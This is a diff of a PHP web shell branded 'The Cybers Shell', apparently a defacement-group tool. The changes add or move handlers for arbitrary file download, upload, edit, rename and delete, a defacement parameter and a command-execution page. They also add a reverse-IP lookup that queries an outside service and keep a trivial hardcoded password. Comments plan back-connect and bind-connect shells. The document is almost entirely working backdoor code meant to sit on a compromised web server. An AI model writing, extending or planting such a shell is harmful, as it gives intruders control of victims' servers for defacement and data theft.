@@ -1,12 +1,12 @@
 <?php
 	session_start();
-	$secret = "123";
+	$senha = "123";
 	// Configuração ==================================================
 	if(!$diretorio = $_GET['ls']){
 		$diretorio = getcwd();
 	}
 
-	if($_POST['senha'] == $secret){
+	if($_POST['senha'] == $senha){
 	$_SESSION['login'] = 1;
 	}
 
@@ -14,28 +14,50 @@
 		$_SESSION['login'] = 0;
 	}
 
+	if($arquivo = $_GET['download']){
+		download($arquivo);
+	}
+
 ?>
 <!DOCTYPE html>
 <html>
+
 <head>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<title>The Cybers Shell [v1.0]</title>
 	<meta charset="utf-8">
 <style>
-
-body{
-	background-color: #090909;
-	margin:0; padding:0;
-	color:#eee;
+* {
+    box-sizing: border-box;
 }
-
+.row::after {content: "";clear: both;display: block;}
+[class*="col-"] {float: left;padding: 15px;}
+.col-1 {width: 8.33%;}
+.col-2 {width: 16.66%;}
+.col-3 {width: 25%;}
+.col-4 {width: 33.33%;}
+.col-5 {width: 41.66%;}
+.col-6 {width: 50%;}
+.col-7 {width: 58.33%;}
+.col-8 {width: 66.66%;}
+.col-9 {width: 75%;}
+.col-10 {width: 83.33%;}
+.col-11 {width: 91.66%;}
+.col-12 {width: 100%;}
+html {font-family: "Lucida Sans", sans-serif;}
+body{background-color: #090909; margin:0; padding:0; color:#eee;}
+a{text-decoration: none;}
+a:hover{color:white;}
 
 <?php
 if(!$_SESSION['login']){
 echo"
+
 #login img{
 	width:150px;
 	margin-left:50px;
 }
+
 #login form{
 	margin:0 auto;
 	width:250px;
@@ -68,7 +90,6 @@ echo"
 }
 else{
 echo "
-
 h2 a{
 	text-decoration: none;
 }
@@ -103,17 +124,20 @@ input:hover{
 tr:hover{
 	background-color:#333;
 }
-nav{
-	float:right;
-	text-align: center;
-	/background-color:#111;
-	width:350px;
-	height:50px;
-}
+
 li{
 	display: inline-block;
 	width:100px;
 }
+
+li a{
+	color:white;
+}
+
+li a:hover{
+	color:red;
+}
+
 li:hover{
 	color:red;
 	cursor:pointer;
@@ -144,19 +168,38 @@ a{
 .check{
 	width:30px;
 }
+
+.linha::after {
+    content: '';
+    clear: both;
+    display: block;
+    background-color:#aaa;
+}
+
+
 #info{
+	width:100%;
+	padding:10px;
+	float:left;
 	border: solid 1px #222;
 	background-color:#111;
-	width:400px;
-	float:left;
 	margin-top:10px;
-	padding:5px;
 }
 
 #logo{
-	/border: solid 1px blue;
-	width:400px;
 	float:left;
+	text-align: center;
+}
+
+#menu{
+	text-align: center;
+	padding:0px;
+}
+
+
+
+#logo h2{
+	height:1px;
 }
 
 #shell{
@@ -234,44 +277,127 @@ else{
 	- Back connect
 	- Bind connect
 	- Auto destruir
+	- Auto update
 
 
-
+	Features!!!
+	- memoria
+	- processos
+	- time up
 */
 
-	// Funções =======================================================
-
+// Funções =======================================================
 function painel($diretorio){
-echo "<header>";
-echo "<div id='info'>";
-echo "<small>Kernel: ";echo php_uname('r');echo"</small><br />";
-echo "<small>Machine: ";echo php_uname('m');echo"</small><br />";
-echo "<small>Os: ";echo php_uname('n');echo"</small><br />";
-echo "<small>Ip: $_SERVER[REMOTE_ADDR]</small><br />";
-echo "<small>Host: $_SERVER[HTTP_HOST]</small><br />";
-echo "</div>";
 echo "
-</header>
-<center>
+<div class='row'>
+	<div class='col-4'>
+		<div id='info'>
+			<small>
+			Kernel: ";echo php_uname('r');echo"<br />
+			Machine: ";echo php_uname('m');echo"<br />
+			Os: ";echo php_uname('n');echo"<br />
+			Ip: $_SERVER[REMOTE_ADDR]<br />
+			Host: $_SERVER[HTTP_HOST]<br />
+			</small>
+		</div>
+	</div>
 
-<div id='logo'>
-	<img style='width:100px' src='Logo.png'>
-	<h2><a href='shell.php' title='Home'>The Cybers Shell</a></h2>
+	<div class='col-4' id='logo'>
+		<a href='shell.php' title='Home'>
+			<img style='width:100px' src='Logo.png'>
+			<h2>The Cybers Shell</h2>
+		</a>
+	</div>
+
+	<div class='col-4'>
+		<div id='info'>
+			<small>
+			Kernel: ";echo php_uname('r');echo"<br />
+			Machine: ";echo php_uname('m');echo"<br />
+			Os: ";echo php_uname('n');echo"<br />
+			Ip: $_SERVER[REMOTE_ADDR]<br />
+			Host: $_SERVER[HTTP_HOST]<br />
+			</small>
+		</div>
+	</div>
 </div>
-</center>
-<nav>
-	<ul>
-		<li><a href='shell.php'>Arquivos</a></li>
-		<li><a href='?pag=comandos'>Comandos</a></li>
-		<li><a href='?pag=info'>Info</a></li>
-	</ul>
-</nav>
 ";
 
-echo "<div id='shell'>";
+echo "
+<div class='row'>
+	<div class='col-12' id='menu'>
+	<nav>
+		<ul>
+			<li><a href='shell.php'>Arquivos</a></li>
+			<li><a href='?pag=comandos'>Comandos</a></li>
+			<li><a href='?pag=lookup'>Lookup</a></li>
+			<li><a href='?pag=info'>Info</a></li>
+		</ul>
+	</nav>
+	</div>
+</div>
+";
+
+// POST e GET ==================================================
+if($renomear = $_POST['renomear'] and $pasta = $_POST['pasta'] and $antigo = $_POST['antigo']){
+	renomea_arquivo($renomear, $antigo, $pasta);
+}
+if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
+	salvar($salvar,$arquivo);
+	echo "Arquivo salvo!";
+}
+if($editar = $_GET['editar']){
+	editar($editar);
+}
+if($deletar = $_GET['deletar']){
+	deletar($deletar);
+}
+if($upar = $_FILES['upload']){
+	upload($upar, $diretorio);
+}
+if($criar = $_POST['criar'] and $nome = $_POST['nome']){
+	salvar($criar, "$diretorio/$nome");
+	echo "Arquivo criado!";
+}
+if($novo = $_GET['novo']){
+	criar($novo);
+}
+if($deface = $_GET['deface']){
+	deface($deface);
+}
+if($menu = $_GET['menu']){
+	if($menu == "comandos"){
+		executar($diretorio);
+		exit();
+	}
+}
 
 $page = $_GET['pag'];
-if($page == 'comandos'){
+
+if($page == 'lookup'){
+	echo "
+		<section>
+			<header>Ip Lookup Domain</header>
+			<article>
+			<center>
+				<form action='shell.php' method='get'>
+					<input type='hidden' name='pag' value='lookup'></input>
+					<label>Dominio ou IP:</label>
+					<input type='text' name='host' value='$_GET[host]'></input>
+					<input type='submit' value='go'></input>
+				</form>
+			</center>
+			";
+			if($host = $_GET['host']){
+				reverse($host);
+			}
+			echo"
+			</article>
+		</section>
+	";
+}
+
+else if($page == 'comandos'){
 
 	echo "
 		<section>
@@ -287,7 +413,6 @@ if($page == 'comandos'){
 		</section>
 	";
 }
-
 else if($page == 'info'){
 		echo "
 		<section>
@@ -297,6 +422,10 @@ else if($page == 'info'){
 			</article>
 		</section>
 	";
+}
+else if($page == 'renomear'){
+	$arquivo = $_GET['arquivo'] and $dir = $_GET['pasta'];
+	renomear($arquivo, $dir);
 }
 
 else{
@@ -308,9 +437,8 @@ else{
 // 	<input name='logout' type='submit' value='Logout'>
 // </form>
 // ";
-echo "<center><a id='rodape' href='http://www.fb.com/TheCybersTeam' title='Coded by OFFSET'>The Cybers Team 2016</a></center>";
+echo "<center><a id='rodape' href='http://www.fb.com/TheCybersTeam'>The Cybers Team 2016</a></center>";
 
-echo "</div>";
 }
 
 function login(){
@@ -327,6 +455,27 @@ function login(){
 	";	
 }
 
+
+function reverse($host){
+
+	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
+	curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$host");
+	curl_setopt($ch, CURLOPT_HEADER, 0);
+	curl_setopt($ch, CURLOPT_POST, 1);
+	$json = curl_exec($ch);
+	$array = get_object_vars(json_decode($json));
+	echo "<center>";
+	echo "Total: $array[domainCount]<br />";
+	echo "Host: $array[remoteAddress]<br />";
+	echo "Ip: $array[remoteIpAddress]<br /><br />";
+	echo "</center>";
+	echo "<table style='border:0px'>";
+	foreach($array[domainArray] as $dominio){
+		echo "<tr><td><a target='_blank' href='http://$dominio[0]'>$dominio[0]</a></td></tr>";
+	}	
+	echo "</table>";
+}
 
 	function permissao($arquivo){
 		$perms = fileperms($arquivo);
@@ -366,6 +515,10 @@ function login(){
 		// 	</form>
 		// ";
 		echo "
+
+		<div class='row'>
+		<div class='col-12'>
+
 			<table>
 				<tr style='background-color:#222'>
 					<th class='check'><input type=checkbox></input></th>
@@ -403,18 +556,31 @@ function login(){
 				echo "<td>".filesize($file)." bytes</td>";
 				echo "<td>
 					<a href='?download=$file' title='Baixar'>B</a>
-					<a href='?renomear=$nome&pasta=$dir' title='Renomear'>R</a>
+					<a href='?pag=renomear&arquivo=$nome&pasta=$dir' title='Renomear'>R</a>
 					<a href='?editar=$file' title='Editar'>E</a>
 					<a href='?deletar=$file' title='Deletar'>D</a>
 					</td>";
 				echo "</tr>";
 			}
 		}
-		echo "</table>";
-		upar($diretorio);
+		echo "</table>
+		</div>
+		</div>
+		
+		<div class='row'>
+			<div class='col-4'>
+				";acao();echo"
+			</div>
+			<div class='col-4'>
+				";upar($diretorio);echo"
+			</div>
+		</div>
+
+		";
 	}
 
 	function download($arquivo){
+
 	    header('Content-Type: application/octet-stream');
 	    header('Content-Length: '.filesize($arquivo));
 	    header('Content-Disposition: filename='.$arquivo);
@@ -438,15 +604,25 @@ function login(){
 	}
 
 	function renomear($arquivo, $dir){
-		echo "<form action=shell.php method=post>";
-		$arq = file($editar);
-		echo "<input name=pasta type=hidden value='$dir'>";
-		echo "<input name=antigo type=hidden value='$arquivo'>";
-		echo "<label>Novo nome:</label>";
-		echo "<input name=renomear type=text value='$arquivo'>";
-		echo "<br />";
-		echo "<input type=submit value=renomear>";
-		echo "</form>";
+		echo"
+		<section>
+			<header>Informações</header>
+			<article>
+			";
+			echo "<form action=shell.php method=post>";
+			$arq = file($editar);
+			echo "<input name=pasta type=hidden value='$dir'>";
+			echo "<input name=antigo type=hidden value='$arquivo'>";
+			echo "<label>Novo nome:</label>";
+			echo "<input name=renomear type=text value='$arquivo'>";
+			echo "<br />";
+			echo "<input type=submit value=renomear>";
+			echo "</form>";
+			echo"
+			</article>
+		</section>
+		";
+		
 		exit();
 	}
 
@@ -503,10 +679,24 @@ function login(){
 		echo "Arquivo deletado!";
 	}
 
+	function acao(){
+		echo "
+		<form>
+		<label>Selecionados:</label><br/>
+		<select style='width:150px'>
+			<option>--</option>
+			<option>Deletar</option>
+		</select>
+		<input type='submit' value='ok'></input>
+		</form>
+		";
+	}
+
 	function upar($diretorio){
 		echo "
 		<center>
 		<form class=upar enctype='multipart/form-data' action='shell.php' method='post'>
+			<label>Upload de arquivos:</label><br />
 			<input type='file' name='upload'/>
 			<input type='hidden' diretorio='$diretorio'/>
 			<input id='upar' type='submit' value='Upar!'/>
@@ -550,64 +740,12 @@ function login(){
 		}
 	}
 
-	// POST e GET ==================================================
-	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
-		salvar($salvar,$arquivo);
-		echo "Arquivo salvo!";
-	}
-	if($arquivo = $_GET['download']){
-		download($arquivo);
-	}
-
-	if($editar = $_GET['editar']){
-		editar($editar);
-	}
-
-	if($deletar = $_GET['deletar']){
-		deletar($deletar);
-	}
-
-	if($upar = $_FILES['upload']){
-		upload($upar, $diretorio);
-	}
-
-
-	if($criar = $_POST['criar'] and $nome = $_POST['nome']){
-		salvar($criar, "$diretorio/$nome");
-		echo "Arquivo criado!";
-	}
-
-	if($renomear = $_GET['renomear'] and $dir = $_GET['pasta']){
-		renomear($renomear, $dir);
-	}
-
-	if($renomear = $_POST['renomear'] and $pasta = $_POST['pasta'] and $antigo = $_POST['antigo']){
-		renomea_arquivo($renomear, $antigo, $pasta);
-	}
-
-	if($novo = $_GET['novo']){
-		criar($novo);
-	}
-
-	if($deface = $_GET['deface']){
-		deface($deface);
-	}
-
-	if($menu = $_GET['menu']){
-		if($menu == "comandos"){
-			executar($diretorio);
-			exit();
-		}
-	}
-
 	// Shell =======================================================
 	// navegar($diretorio);
 	// listar($diretorio);
 	?>
 	
 </div>
-
-
 
 </body>
 </html>
